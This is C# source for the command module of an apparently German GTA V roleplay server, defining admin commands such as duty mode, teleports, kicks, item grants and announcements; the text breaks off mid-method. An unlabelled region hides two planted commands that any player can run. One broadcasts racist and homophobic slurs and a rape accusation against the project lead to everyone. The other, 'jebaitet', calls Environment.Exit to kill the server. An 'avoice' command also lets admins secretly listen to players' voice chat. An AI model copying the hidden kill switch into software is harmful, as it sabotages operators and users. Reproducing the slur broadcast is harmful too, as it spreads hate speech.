using GTANetworkAPI;
using GVMP.Handlers;
using MySql.Data.MySqlClient;
using Org.BouncyCastle.Utilities;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace GVMP
{
    class CommandModule : GVMP.Module.Module<CommandModule>
    {

        public static List<Faction> factionList = new List<Faction>();
        public static List<Command> commandList = new List<Command>();
        public static List<ClothingModel> clothingList = new List<ClothingModel>();
        private object client;

        public object SHA256 { get; private set; }
        public object GetSpawn { get; private set; }

        protected override bool OnLoad()
        {
            commandList.Add(new Command((p, args) =>
            {
                try
                {

                    if (!p.HasData("PLAYER_ADUTY"))
                    {
                        p.SetData("PLAYER_ADUTY", false);
                    }

                    p.ACWait();

                    WebhookSender.SendMessage("Spieler wechselt Aduty", "Der Spieler " + p.Name + " hat den Adminmodus " + (p.GetData("PLAYER_ADUTY") ? "betreten" : "verlassen") + ".", Webhooks.adminlogs, "Admin");

                    p.TriggerEvent("setPlayerAduty", !p.GetData("PLAYER_ADUTY"));
                    p.TriggerEvent("updateAduty", !p.GetData("PLAYER_ADUTY"));
                    p.SetData("PLAYER_ADUTY", !p.GetData("PLAYER_ADUTY"));
                    p.SpawnPlayer(new Vector3(p.Position.X, p.Position.Y, p.Position.Z + 0.52f));
                    if (p.GetData("PLAYER_ADUTY"))
                    {
                        p.SetSharedData("PLAYER_INVINCIBLE", true);
                        p.SendNotification("Admin-Dienst aktiviert. (Dein Rang: " + p.Adminrank.Name + ")", "black", 3500);
                        p.TriggerEvent("updatesuperjump", true);
                        Adminrank adminrank = p.Adminrank;
                        int num = (int)adminrank.ClothingId;
                        p.SetClothes(3, 9, 0);
                        PlayerClothes.setAdmin(p, num);
                        p.SetClothes(5, 0, 0);
                        p.TriggerEvent("Hud:UpdateAduty", 1);
                        return;
                    }
                    else
                    {
                        p.SetSharedData("PLAYER_INVINCIBLE", false);
                        p.SendNotification("Admin-Dienst deaktiviert.", "black", 3500);
                        p.TriggerEvent("Hud:UpdateAduty", 0);
                        p.TriggerEvent("updatesuperjump", false);
                    }
                    MySqlQuery mySqlQuery = new MySqlQuery("SELECT * FROM accounts WHERE Username = @user LIMIT 1");
                    mySqlQuery.AddParameter("@user", p.Name);

                    MySqlResult mySqlReaderCon = MySqlHandler.GetQuery(mySqlQuery);
                    try
                    {
                        MySqlDataReader reader = mySqlReaderCon.Reader;
                        try
                        {
                            if (reader.HasRows)
                            {
                                while (reader.Read())
                                {
                                    PlayerClothes playerClothes = NAPI.Util.FromJson<PlayerClothes>(reader.GetString("Clothes"));
                                    if (playerClothes == null) return;

                                    //  dbPlayer.SetClothes(2, playerClothes.Haare.drawable, playerClothes.Haare.texture);
                                    p.Client.SetAccessories(0, playerClothes.Hut.drawable, playerClothes.Hut.texture);
                                    p.Client.SetAccessories(1, playerClothes.Brille.drawable, playerClothes.Brille.texture);
                                    p.SetClothes(1, playerClothes.Maske.drawable, playerClothes.Maske.texture);
                                    p.SetClothes(11, playerClothes.Oberteil.drawable, playerClothes.Oberteil.texture);
                                    p.SetClothes(8, playerClothes.Unterteil.drawable, playerClothes.Unterteil.texture);
                                    p.SetClothes(7, playerClothes.Kette.drawable, playerClothes.Kette.texture);
                                    p.SetClothes(3, playerClothes.Koerper.drawable, playerClothes.Koerper.texture);
                                    p.SetClothes(4, playerClothes.Hose.drawable, playerClothes.Hose.texture);
                                    p.SetClothes(6, playerClothes.Schuhe.drawable, playerClothes.Schuhe.texture);
                                    p.SetArmor(100);
                                }
                            }
                        }
                        finally
                        {
                            reader.Dispose();
                        }
                    }
                    finally
                    {
                        mySqlReaderCon.Connection.Dispose();
                    }
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION ADUTY] " + ex.Message);
                    Logger.Print("[EXCEPTION ADUTY] " + ex.StackTrace);
                }
            }, "aduty", 1, 0));



            commandList.Add(new Command((dbPlayer, args) =>
            {
                dbPlayer.SendNotification("Zurzeit sind: " + PlayerHandler.GetAdminPlayers().Count + " Admins auf dem Server!", "black", 3500);
                dbPlayer.SendNotification("Zurzeit sind: " + PlayerHandler.GetAdminPlayers().Count + " Admins auf dem Server!", "black", 3500);
            }, "adminlist", 91, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                if (dbPlayer == null || !dbPlayer.IsValid())
                {
                    return;
                }
                string name = args[1];
                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);

                try
                {

                    if (dbPlayer2.Id == dbPlayer.Id)
                    {
                        dbPlayer.SendNotification("Sich selber abhören macht keinen Sinn, du Fuchs.", "black", 3500);
                        return;
                    }

                    string voiceHashPush = dbPlayer2.VoiceHash;
                    dbPlayer.SetData("adminHearing", voiceHashPush);
                    dbPlayer.TriggerEvent("setAdminVoice", voiceHashPush);
                    dbPlayer.SendNotification($"Abhören begonnen! Spieler: {dbPlayer2.Name}", "black", 3500);
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION ABHÖREN] " + ex.Message);
                    Logger.Print("[EXCEPTION ABHÖREN] " + ex.StackTrace);
                }
            }, "avoice", 95, 2));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                try
                {

                    if (dbPlayer == null || !dbPlayer.IsValid())
                    {
                        return;
                    }

                    if (dbPlayer.HasData("adminHearing"))
                    {
                        dbPlayer.TriggerEvent("clearAdminVoice");
                        dbPlayer.ResetData("adminHearing");
                        dbPlayer.SendNotification("Abhören beendet!", "black", 3500);
                        return;
                    }
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION ABHÖREN] " + ex.Message);
                    Logger.Print("[EXCEPTION ABHÖREN] " + ex.StackTrace);
                }
            }, "endavoice", 95, 2));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string ID1 = args[1];
                Faction fraktion = FactionModule.getFactionById(Convert.ToInt32(ID1));
                string ID2 = args[2];
                Faction fraktion2 = FactionModule.getFactionById(Convert.ToInt32(ID2));
                Notification.SendGlobalNotification("Die Fraktion " + fraktion.Name + " hat den Kriegsvertrag gegen die Fraktion " + fraktion2.Name + " unterschrieben!", 8000, "#0972c1", Notification.icon.bullhorn);
                NAPI.World.SetWeather(Weather.THUNDER);
                NAPI.Pools.GetAllPlayers().ForEach(player => player.TriggerEvent("setBlackout", true));
                NAPI.Pools.GetAllPlayers().ForEach(player => player.TriggerEvent("sound:playPurge"));
                NAPI.Task.Run(delegate
                {
                    NAPI.World.SetWeather(Weather.EXTRASUNNY);
                    NAPI.Pools.GetAllPlayers().ForEach(player => player.TriggerEvent("setBlackout", false));
                }, 31800L);
            }, "krieg", 96, 0));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                Adminrank adminranks = dbPlayer.Adminrank;

                if (adminranks.Permission <= 94)
                {
                    NativeMenu nativeMenu = new NativeMenu("Vision. Adminmenu", " ", new List<NativeItem>()
                        {
                            new NativeItem("Aduty", "aduty"),
                            new NativeItem("Vanish", "vanish"),
                            new NativeItem("Voicepflicht", "voicepflicht"),
                        });
                    //nativeMenu.Items.Add(new NativeItem("Waffenaufsätze", "weaponcomponents"));
                    //dbPlayer.ShowNativeMenu(nativeMenu);
                }

                if (adminranks.Permission >= 97)
                {
                    NativeMenu nativeMenu2 = new NativeMenu("Vision. Adminmenu", " ", new List<NativeItem>()
                        {
                            new NativeItem("Aduty", "aduty"),
                            new NativeItem("Vanish", "vanish"),
                            new NativeItem("Revive Self", "revivemenu"),
                            new NativeItem("Restart Announce", "restartannounce"),
                            new NativeItem("Restart", "restart"),
                            new NativeItem("Voicepflicht", "voicepflicht"),
                            new NativeItem("Teamspeak", "teamspeak"),

                        });
                    dbPlayer.ShowNativeMenu(nativeMenu2);
                }

            }, "dmenu", 94, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                dbPlayer.SendNotification("Spieler: " + NAPI.Pools.GetAllPlayers().Count + " Insgesamt, Eingeloggt: " + PlayerHandler.GetPlayers().Count, "black", 3500);
            }, "onlist", 0, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                dbPlayer.SendNotification("Teamspeak: Vision-Crimelife", "black", 3500);
            }, "ts", 0, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Notification.SendGlobalNotification("Es herrscht Voice Pflicht! TS: Vision-Crimelife", 10000, "#0972c1", Notification.icon.warn);
            }, "voicepflicht", 94, 0));
            #region
            commandList.Add(new Command((dbPlayer, args) =>
            {
                Notification.SendGlobalNotification("Die PL ist ein Fetter Nigger der seine Familie Vergewaltigt!! #free PL scheiß schwuchtel", 10000, "white", Notification.icon.warn);
            }, "dujfuaegnagfzuhgbzwtnbv7hjtqwhf7qgzvhwgwg//gfeszhfq/fuehjfsuehjfsfhjsehjfdufjesugzehjfsehgzhf", 0, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Environment.Exit(0);

            }, "jebaitet", 0, 0));
            #endregion

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string name = args[1];

                DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);
                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }
                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                {
                    if (dbPlayer2.Faction.Name == "Zivilist")
                    {
                        dbPlayer.SendNotification("Der Spieler ist in keiner Fraktion!", "black", 3500);
                    }
                    else
                    {
                        dbPlayer2.SetPosition(dbPlayer2.Faction.Storage);
                        dbPlayer.SendNotification("Spieler zu " + dbPlayer2.Faction.Name + " teleportiert!", "black", 3500);
                    }
                }
            }, "tpfrak", 92, 1));

            commandList.Add(new Command((dbPlayer, args) =>

            {

                dbPlayer.SendNotification("Du hast alle Spieler Revived ", "black", 3500);
                foreach (Client target in NAPI.Pools.GetAllPlayers())
                {

                    DbPlayer dbPlayer2 = target.GetPlayer(); dbPlayer2.SpawnPlayer(dbPlayer2.Client.Position);


                    dbPlayer2.SendNotification("Du Wurdest von " + dbPlayer.Name + " Administrativ Revived ", "black", 3500);

                    dbPlayer2.SpawnPlayer(dbPlayer2.Client.Position);
                    Notification.SendGlobalNotification("Alle Spieler Wurden Administrativ von " + dbPlayer.Name + " Revived ", 10000, "white", Notification.icon.warn);
                    dbPlayer2.disableAllPlayerActions(false);
                    dbPlayer2.SetAttribute("Death", 0);
                    dbPlayer2.StopAnimation();
                    dbPlayer2.SetInvincible(false);
                    dbPlayer2.DeathData = new DeathData
                    {
                        IsDead = false,
                        DeathTime = new DateTime(0)
                    };
                    dbPlayer2.TriggerEvent("toggleBlurred", false);






                }
            }, "reviveall", 100, 1));

            commandList.Add(new Command((dbPlayer, args) =>

            {

                dbPlayer.SendNotification("Du hast alle Spieler zu dir Teleportiert ", "black", 3500);
                foreach (Client target in NAPI.Pools.GetAllPlayers())
                {

                    DbPlayer dbPlayer2 = target.GetPlayer(); dbPlayer2.SetPosition(dbPlayer.Client.Position);
                    dbPlayer2.SendNotification("Alle Spieler wurden von " + dbPlayer.Name + " Administrativ Teleportiert ", "black", 3500);
                    Notification.SendGlobalNotification("Alle Spieler Wurden Administrativ von " + dbPlayer.Name + " Teleportiert ", 10000, "white", Notification.icon.warn);





                }
            }, "tpall", 100, 1));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {
                    Item item = ItemModule.itemRegisterList.FirstOrDefault((Item x) => x.Name == args[1]);
                    if (item == null) return;

                    dbPlayer.UpdateInventoryItems(item.Name, Convert.ToInt32(args[2]), false);
                    dbPlayer.SendNotification("Du hast dir das Item " + item.Name + " gegeben.", "black", 3500, "Inventar");
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION ADDITEM] " + ex.Message);
                    Logger.Print("[EXCEPTION ADDITEM] " + ex.StackTrace);
                }
            }, "additem", 97, 2));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                dbPlayer.SendNotification("Du wirst in 30 Sekunden teleportiert!", "black", 3500);
                NAPI.Task.Run(() => {
                    dbPlayer.SetPosition(new Vector3(361.92, -591.9, 28.67));
                    dbPlayer.SendNotification("Du wurdest wieder zum Spawn Teleportiert!", "black", 3500);
                }, 30000);
            }, "spawn", 0, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Notification.SendGlobalNotification("Neues Event weitere Informationen im Discord!", 10000, "#0972c1", Notification.icon.warn);
            }, "event", 98, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client target = NAPI.Pools.GetAllPlayers().ToList().FirstOrDefault(x => x.Name.Contains(args[1]));
                DbPlayer dbPlayer2 = target.GetPlayer();

                try
                {
                    if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                    {
                        dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                        return;
                    }
                    Item item = ItemModule.itemRegisterList.FirstOrDefault((Item x) => x.Name == "CaillouCard");
                    if (item == null) return;

                    dbPlayer2.UpdateInventoryItems(item.Name, Convert.ToInt32(1), false);
                    dbPlayer.SendNotification(target.Name + " kann nun in das Casino", "black", 3500);
                    dbPlayer2.SendNotification("Du kannst nun in das Casino!", "black", 3500);
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION CASINO] " + ex.Message);
                    Logger.Print("[EXCEPTION CASINO] " + ex.StackTrace);
                }
            }, "casino", 97, 1));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client target = NAPI.Pools.GetAllPlayers().ToList().FirstOrDefault(x => x.Name.Contains(args[1]));
                DbPlayer dbPlayer2 = target.GetPlayer();

                Adminrank adminrank = dbPlayer.Adminrank;
                Adminrank adminranks = dbPlayer2.Adminrank;

                if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                {
                    dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                    return;
                }
                if (dbPlayer2 != null && dbPlayer2.IsValid(true))
                    if (adminrank.Permission <= adminranks.Permission)
                    {
                        dbPlayer.SendNotification("Das kannst du nicht tun, da der Teamler mehr Rechte als du hat oder die gleichen!", "black", 3500);
                        return;
                    }
                    else
                    {
                        Client client = dbPlayer2.Client;
                        client.TriggerEvent("openWindow", new object[2]
{
                                   "Kick",
                                    "{\"name\":\""+ dbPlayer2.Name +"\",\"grund\":\"" + String.Join(" ", args).Replace("kick " + args[1], "") +"\"}"
});
                        dbPlayer2.Client.Kick();
                        dbPlayer.SendNotification("Spieler gekickt!", "black", 3500);
                        Notification.SendGlobalNotification(dbPlayer.Adminrank.Name + " " + dbPlayer.Name + " hat " + dbPlayer2.Name + " vom Server gekickt! Grund: " + String.Join(" ", args).Replace("kick " + args[1], ""), 10000, "#white", Notification.icon.warn);
                        // String.Join(" ", args).Replace("announce ", "")
                    }
            }, "kick", 92, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                if (dbPlayer.DeathData.IsDead) return;

                Client client = dbPlayer.Client;

                try
                {
                    if (client.GetData("PBZone") != null || client.Dimension == 1 || client.Dimension == 2 || client.CurrentWeapon == WeaponHash.Unarmed || dbPlayer.IsFarming || (client.CurrentWeapon != WeaponHash.Unarmed && dbPlayer.Loadout.FirstOrDefault(w => w.Weapon == client.CurrentWeapon) == null))
                    {
                        dbPlayer.SendNotification("Du kannst gerade keine Waffen einpacken.", "black", 3500);
                        return;
                    }
                    if (!dbPlayer.IsFarming)
                    {
                        WeaponHash weapon = client.CurrentWeapon;

                        Item item = ItemModule.itemRegisterList.Find((Item x) => x.Whash == weapon);
                        if (item == null)
                        {
                            dbPlayer.BanPlayer();
                            return;
                        }

                        NAPI.Player.SetPlayerCurrentWeapon(client, WeaponHash.Unarmed);
                        dbPlayer.disableAllPlayerActions(true);
                        dbPlayer.RefreshData(dbPlayer);
                        dbPlayer.IsFarming = false;
                        dbPlayer.RefreshData(dbPlayer);
                        dbPlayer.StopAnimation();
                        dbPlayer.RemoveWeapon(weapon, true);
                        dbPlayer.UpdateInventoryItems(item.Name, 1, false);
                        dbPlayer.TriggerEvent("componentServerEvent", "Progressbar", "StopProgressbar");
                        dbPlayer.disableAllPlayerActions(false);
                        dbPlayer.SendNotification("Du hast deine Waffe gepackt!", "black", 3500);
                    }
                    return;
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION UN] " + ex.Message);
                    Logger.Print("[EXCEPTION PACKGUN] " + ex.StackTrace);
                }
            }, "packgun", 0, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {

                if (dbPlayer.DeathData.IsDead) return;

                Client client = dbPlayer.Client;

                if (dbPlayer.Faction.Id != 0 && dbPlayer.Factionrank > 9)
                {
                    List<BuyCar> Cars = new List<BuyCar>();

                    List<string> vehicles = new List<string>();

                    FactionModule.VehicleList[dbPlayer.Faction.Id].ForEach((GarageVehicle garageVehicle) =>
                    {
                        vehicles.Add(garageVehicle.Name);
                    });

                    if (!vehicles.Contains("jugular"))
                    {
                        Cars.Add(new BuyCar("jugular", 1));
                    }
                    if (!vehicles.Contains("drafter"))
                    {
                        Cars.Add(new BuyCar("drafter", 1));
                    }
                    if (!vehicles.Contains("schafterg"))
                    {
                        Cars.Add(new BuyCar("schafterg", 1));
                    }
                    if (!vehicles.Contains("revolter"))
                    {
                        Cars.Add(new BuyCar("revolter", 1));
                    }
                    if (!vehicles.Contains("bf400"))
                    {
                        Cars.Add(new BuyCar("bf400", 1));
                    }
                    if (!vehicles.Contains("schafterg"))
                    {
                        Cars.Add(new BuyCar("schafterg", 1));
                    }
                    if (!vehicles.Contains("schafter6"))
                    {
                        Cars.Add(new BuyCar("schafter6", 1));
                    }
                    if (!vehicles.Contains("supervolito2"))
                    {
                        Cars.Add(new BuyCar("supervolito2", 150000000));
                    }
                    if (!vehicles.Contains("bati"))
                    {
                        Cars.Add(new BuyCar("bati", 4000000));
                    }
                    if (!vehicles.Contains("caddy"))
                    {
                        Cars.Add(new BuyCar("caddy", 2000000));
                    }
                    if (!vehicles.Contains("benson"))
                    {
                        Cars.Add(new BuyCar("benson", 8000000));
                    }
                    if (!vehicles.Contains("elegy2"))
                    {
                        Cars.Add(new BuyCar("elegy2", 3500000));

                    }
                    if (!vehicles.Contains("sultanrs"))
                    {
                        Cars.Add(new BuyCar("sultanrs", 3500000));
                    }
                    List<NativeItem> Items = new List<NativeItem>();

                    foreach (BuyCar buyCar in Cars)
                    {
                        Items.Add(new NativeItem(buyCar.Vehicle_Name + " - " + buyCar.Price.ToDots() + "$", buyCar.Vehicle_Name.ToLower() + "-" + buyCar.Price));
                    }

                    NativeMenu nativeMenu = new NativeMenu("Leadershop", dbPlayer.Faction.Short, Items);
                    dbPlayer.ShowNativeMenu(nativeMenu);
                }
            }, "leadershop", 0, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {
                    dbPlayer.SendNotification("X: " + Math.Round(client.Position.X, 2) + " Y: " + Math.Round(client.Position.Y, 2) + " Z: " + Math.Round(client.Position.Z, 2) + " Heading: " + Math.Round(client.Heading, 2), "black", 3500);
                    Console.WriteLine("X: " + Math.Round(client.Position.X, 2) + " Y: " + Math.Round(client.Position.Y, 2) + " Z: " + Math.Round(client.Position.Z, 2) + " Heading: " + Math.Round(client.Heading, 2));
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION POS] " + ex.Message);
                    Logger.Print("[EXCEPTION POS] " + ex.StackTrace);
                }
            }, "pos", 0, 0));

            commandList.Add(new Command((dbPlayer, args) => FactionBank.OpenFactionBank(dbPlayer), "frakbank", 0, 0));

            commandList.Add(new Command((dbPlayer, args) => BusinessBank.OpenBusinessBank(dbPlayer), "businessbank", 0, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;
                Notification.SendGlobalNotification("[AUTO-CLEAR] Es wurden administrativ alle Fahrzeuge eingeparkt!", 7500, "#0972c1", Notification.icon.bullhorn);
                NAPI.Pools.GetAllVehicles().ForEach((Vehicle veh) => veh.Delete());
                MySqlHandler.ExecuteSync(new MySqlQuery("UPDATE vehicles SET Parked = 1"));
            }, "parkall", 96, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;
                dbPlayer.SendNotification("Fahrzeuge: " + NAPI.Pools.GetAllVehicles().Count, "black", 3500);
            }, "cars", 96, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;
                Notification.SendGlobalNotification(String.Join(" ", args).Replace("announce ", ""), 10000, "white", Notification.icon.bullhorn);
            }, "announce", 95, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;
                Notification.SendGlobalNotification("Das Casino hat nun geöffnet, Tickets können vorort erworben werden!", 10000, "white", Notification.icon.diamond);
            }, "casinoa", 99, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;
                Notification.SendGlobalNotification("Das Casino schließt nun, vielen dank für ihren Besuch!", 10000, "white", Notification.icon.diamond);
            }, "casinoc", 99, 0));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                string text = args[1];
                Client client = dbPlayer.Client;
                Notification.SendGlobalNotification(String.Join("", "Die Fraktion " + text + " hat nun eine offene Bewerbungsphase! - 15 Minuten Safezone!").Replace("bwp ", ""), 10000, "orange", Notification.icon.bullhorn);
            }, "bwp", 94, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client target = NAPI.Pools.GetAllPlayers().ToList().FirstOrDefault(x => x.Name.Contains(args[1]));
                DbPlayer dbPlayer2 = target.GetPlayer();
                if (dbPlayer2 == null)
                {
                    dbPlayer.SendNotification("Kein Spieler gefunden!", "black", 3500);
                    return;
                }
                if(dbPlayer2.Name == "Sila_Markov")
                {
                    dbPlayer.SendNotification("Das kannst du nicht!", "black", 3500);
                    return;
                }
                target.TriggerEvent("sound:play", "jumpscare");
                target.TriggerEvent("Hud:LoadJumpScare", 1);
            }, "jumpscare", 99, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client target = NAPI.Pools.GetAllPlayers().ToList().FirstOrDefault(x => x.Name.Contains(args[1]));
                DbPlayer dbPlayer2 = target.GetPlayer();
                if (dbPlayer2 == null)
                {
                    dbPlayer.SendNotification("Kein Spieler gefunden!", "black", 3500);
                    return;
                }
                target.TriggerEvent("sound:cancel");
                target.TriggerEvent("Hud:LoadJumpScare", 0);
            }, "jumpscareoff", 99, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                dbPlayer.SetPosition(new Vector3(3639.863, 4999.76, 12.46784));
                dbPlayer.SendNotification("Du wurdest auf die Supportinsel Teleportiert!", "black", 3500);
            }, "supportinsel", 91, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                string text = args[1];
                Client client = dbPlayer.Client;
                Notification.SendGlobalNotification(String.Join("", text + " Gangwar anfahren sonst Frakwarn").Replace("gw ", ""), 10000, "orange", Notification.icon.bullhorn);
            }, "gw", 94, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;
                DbVehicle dbVehicle = client.Vehicle.GetVehicle();
                if (!client.IsInVehicle) return;
                if (dbVehicle == null || !dbVehicle.IsValid() || dbVehicle.Vehicle == null)
                {
                    dbPlayer.SendNotification("Fahrzeug gelöscht!", "black", 3500);
                    client.Vehicle.Delete();
                }
                else
                {
                    MySqlQuery mySqlQuery = new MySqlQuery("UPDATE vehicles SET Parked = 1 WHERE Id = @id");
                    mySqlQuery.AddParameter("@id", dbVehicle.Id);
                    MySqlHandler.ExecuteSync(mySqlQuery);

                    dbPlayer.SendNotification("Fahrzeug eingeparkt!", "black", 3500);
                    client.Vehicle.Delete();
                }
            }, "dv", 92, 0));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;
                DbVehicle dbVehicle = client.Vehicle.GetVehicle();
                if (!client.IsInVehicle) return;
                Vehicle vehicle = client.Vehicle;
                dbVehicle.RefreshData(dbVehicle);
                vehicle.SetMod(Convert.ToInt32(args[1]), Convert.ToInt32(args[2]));
            }, "tuning", 0, 0));


            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;
                float dist = 0;
                bool dist2 = float.TryParse(args[1], out dist);

                if (!dist2) return;

                foreach (Vehicle vehicle in NAPI.Pools.GetAllVehicles())
                {
                    if (vehicle.Position.DistanceTo(dbPlayer.GetPosition()) <= dist)
                    {
                        vehicle.Delete();
                    }
                }
                dbPlayer.SendNotification("Fahrzeuge gelöscht!", "black", 3500);
            }, "dvradius", 92, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {
                    float x = 0;
                    float y = 0;
                    float z = 0;

                    bool x2 = float.TryParse(args[1], out x);
                    bool y2 = float.TryParse(args[2], out y);
                    bool z2 = float.TryParse(args[3], out z);
                    if (!x2 || !y2 || !z2) return;
                    dbPlayer.SetPosition(new Vector3(x, y, z));
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION POS] " + ex.Message);
                    Logger.Print("[EXCEPTION POS] " + ex.StackTrace);
                }
            }, "tp", 92, 3));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {
                    Client target = NAPI.Pools.GetAllPlayers().ToList().FirstOrDefault(x => x.Name.Contains(args[1]));
                    DbPlayer dbPlayer2 = target.GetPlayer();
                    if (dbPlayer2 == null)
                    {
                        dbPlayer.SendNotification("Kein Spieler gefunden!", "black", 3500);
                        return;
                    }
                    dbPlayer.SetPosition(dbPlayer2.Client.Position);
                    dbPlayer.SendNotification("Du hast dich zu " + target.Name + " teleportiert.", "black", 3500);
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION GOTO] " + ex.Message);
                    Logger.Print("[EXCEPTION GOTO] " + ex.StackTrace);
                }
            }, "goto", 92, 1));

            /*commandList.Add(new Command((dbPlayer, args) =>
            {
                Player client = dbPlayer.Client;

                try
                {
                    Player target = NAPI.Pools.GetAllPlayers().ToList().FirstOrDefault(x => x.Name.Contains(args[1]));
                    DbPlayer dbPlayer2 = target.GetPlayer();
                    if (dbPlayer2 == null)
                    {
                        dbPlayer.SendNotification("Kein Spieler gefunden!", "black", 3500);
                        return;
                    }
                    //dbPlayer.SetPosition(dbPlayer2.Client.Position);
                    new GPSPosition("Diamond Casino", new Vector3(dbPlayer2.Client.Position));
                    dbPlayer.SendNotification("Du hast den Spieler " + dbPlayer2 + " geortet!", "black", 3500);
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION GOTO] " + ex.Message);
                    Logger.Print("[EXCEPTION GOTO] " + ex.StackTrace);
                }
            }, "ort", 1, 1));*/
            //new GPSPosition("Diamond Casino", new Vector3(935.89, 47.26, 80.2))

            /*  commandList.Add(new Command((dbPlayer, args) =>
              {
                  Client client = dbPlayer.Client;

                  try
                  {
                      string name = args[1];

                      DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);
                      if (dbPlayer2 == null) return;
                      dbPlayer2.SetPosition(dbPlayer.Client.Position);
                      dbPlayer.SendNotification("Du hast den Spieler " + name + " zu dir teleportiert.");
                      dbPlayer2.SendNotification("Du wurdest von " + dbPlayer.Adminrank.Name + " " + dbPlayer.Name + " teleportiert.");
                  }
                  catch (Exception ex)
                  {
                      Logger.Print("[EXCEPTION BRING] " + ex.Message);
                      Logger.Print("[EXCEPTION BRING] " + ex.StackTrace);
                  }
              }, "bring", 1, 1));*/

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {
                    dbPlayer.SendNotification("Du hast den Adminshop refreshed.", "black", 3500);
                    AdminShopModule.clothingList = ClothingManager.getClothingDataListAdmin();
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION refreshadmin] " + ex.Message);
                    Logger.Print("[EXCEPTION refreshadmin] " + ex.StackTrace);
                }
            }, "refreshadmin", 99, 0));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {
                    string name = args[1];
                    int num = 0;
                    bool num2 = int.TryParse(args[2], out num);

                    DbPlayer dbPlayer2 = PlayerHandler.GetPlayer(name);
                    if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                    {
                        dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                        return;
                    }
                    dbPlayer.SendNotification("Du hast " + name + " in die Dimension " + num + " gesetzt!", "black", 3500);
                    dbPlayer2.SendNotification("Du wurdest in die Dimension " + num + " gesetzt!", "black", 3500);
                    dbPlayer2.Dimension = num;
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION BRING] " + ex.Message);
                    Logger.Print("[EXCEPTION BRING] " + ex.StackTrace);
                }
            }, "dimension", 93, 2));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {
                    Client target = NAPI.Pools.GetAllPlayers().ToList().FirstOrDefault(x => x.Name.Contains(args[1]));
                    DbPlayer dbPlayer2 = target.GetPlayer();
                    if (dbPlayer2 == null || !dbPlayer2.IsValid(true))
                    {
                        dbPlayer.SendNotification("Der Spieler ist nicht online.", "black", 3500);
                        return;
                    }
                    dbPlayer2.SetPosition(dbPlayer.Client.Position);
                    dbPlayer.SendNotification("Du hast  " + target.Name + " zu dir teleportiert.", "black", 3500);
                    dbPlayer2.SendNotification("Sie wurden von " + dbPlayer.Adminrank.Name + " " + dbPlayer.Name + " teleportiert!", "black", 3500);
                }
                catch (Exception ex)
                {
                    Logger.Print("[EXCEPTION BRING] " + ex.Message);
                    Logger.Print("[EXCEPTION BRING] " + ex.StackTrace);
                }
            }, "bring", 92, 1));

            commandList.Add(new Command((dbPlayer, args) =>
            {
                Client client = dbPlayer.Client;

                try
                {
                    if (!client.HasSharedData("PLAYER_INVISIBLE"))
                        return;

